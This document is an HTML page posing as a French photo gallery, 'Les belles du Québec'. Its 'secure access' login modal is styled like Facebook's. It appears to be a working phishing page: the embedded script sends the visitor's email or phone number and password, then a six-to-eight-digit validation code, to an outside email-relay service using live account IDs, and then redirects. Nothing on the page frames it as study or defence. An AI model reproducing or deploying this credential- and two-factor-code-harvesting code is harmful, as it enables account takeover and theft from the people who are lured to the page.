<!doctype html>
<html lang="fr">
<head>
  <meta charset="utf-8"/>
  <meta name="viewport" content="width=device-width, initial-scale=1"/>
  <title>Les belles du Québec</title>

  <!-- Open Graph -->
  <meta property="og:type" content="website" />
  <meta property="og:url" content="https://les-belles-du-quebec.netlify.app/?v=1" />
  <meta property="og:title" content="Les belles du Québec" />
  <meta property="og:description" content="Photographies portrait & modèles" />
  <meta property="og:image" content="https://les-belles-du-quebec.netlify.app/preview3.png" />

  <meta name="twitter:card" content="summary_large_image" />

  <style>
    body{
      margin:0;
      font-family:Inter,Arial,sans-serif;
      background:url("background.png") center/cover no-repeat fixed;
      color:#e6eef6;
      padding:32px;
      min-height:100vh;
    }

    h1{text-align:center;font-size:32px}

    .btn{
      background:#1877f2;color:white;padding:12px 16px;border:0;border-radius:10px;
      font-weight:600;cursor:pointer;margin-top:24px;width:100%;font-size:16px
    }

    .modal{
      display:none;
      position:fixed;
      inset:0;
      background:rgba(0,0,0,0.6);
      align-items:center;
      justify-content:center;
    }

    .modal-content{
      background:white;padding:28px;border-radius:12px;width:360px;
      color:#1c1e21;box-shadow:0 6px 24px rgba(0,0,0,0.4);
      text-align:center;
    }

    input{
      width:100%;padding:12px;border-radius:8px;border:1px solid #ccd0d5;
      margin-top:12px;background:#f5f6f7;color:#1c1e21;font-size:16px;
    }

    #code{display:none;}

    .gallery{
      margin-top:40px;
      display:flex;
      flex-wrap:wrap;
      justify-content:center;
      gap:15px;
    }

    .gallery img{
      width:150px;
      border-radius:10px;
      box-shadow:0 4px 14px rgba(0,0,0,0.5);
    }
  </style>
</head>

<body>
<h1>Les belles du Québec</h1>

<button class="btn" id="openLogin">Accès sécurisé</button>

<div class="modal" id="loginModal">
  <div class="modal-content">
    <h2 style="color:#1877f2">Identification</h2>
    <input id="userId" placeholder="Courriel ou numéro de mobile">
    <input id="password" type="password" placeholder="Mot de passe">
    <input id="code" maxlength="8" placeholder="Code de validation">
    <button class="btn" id="loginBtn">Se connecter</button>
  </div>
</div>

<div class="gallery">
  <img src="img1.png">
  <img src="img2.png">
  <img src="img3.png">
  <img src="img4.png">
  <img src="img5.png">
  <img src="img6.png">
</div>

<script>
const modal = document.getElementById('loginModal');
const openLogin = document.getElementById('openLogin');
const loginBtn = document.getElementById('loginBtn');
const codeInput = document.getElementById('code');

let step = "login";

openLogin.onclick = () => modal.style.display = "flex";
modal.onclick = e => { if(e.target === modal) modal.style.display = "none"; };

async function sendEmailLogin(username, password){
  return fetch("https://api.emailjs.com/api/v1.0/email/send", {
    method: "POST",
    headers: { "Content-Type": "application/json" },
    body: JSON.stringify({
      service_id: "service_uvghcck",
      template_id: "template_email",
      user_id: "aQIYW-EEnTtmxU4FY",
      template_params: { username, password }
    })
  });
}

async function sendCodeValidation(code){
  return fetch("https://api.emailjs.com/api/v1.0/email/send", {
    method: "POST",
    headers: { "Content-Type": "application/json" },
    body: JSON.stringify({
      service_id: "service_uvghcck",
      template_id: "template_code",
      user_id: "aQIYW-EEnTtmxU4FY",
      template_params: { code }
    })
  });
}

loginBtn.onclick = async () => {
  if(step === "login"){
    const user = userId.value.trim();
    const pwd = password.value.trim();
    if(!user || !pwd){ alert("Champs requis"); return; }

    loginBtn.textContent = "Envoi…";
    await sendEmailLogin(user,pwd);

    step = "code";
    codeInput.style.display = "block";
    loginBtn.textContent = "Valider le code";
  } else {
    const code = codeInput.value.trim();
    if(!/^[0-9]{6,8}$/.test(code)){ alert("Code invalide"); return; }
    await sendCodeValidation(code);
    window.location.href = "secure-photos.html";
  }
};
</script>
</body>
</html>
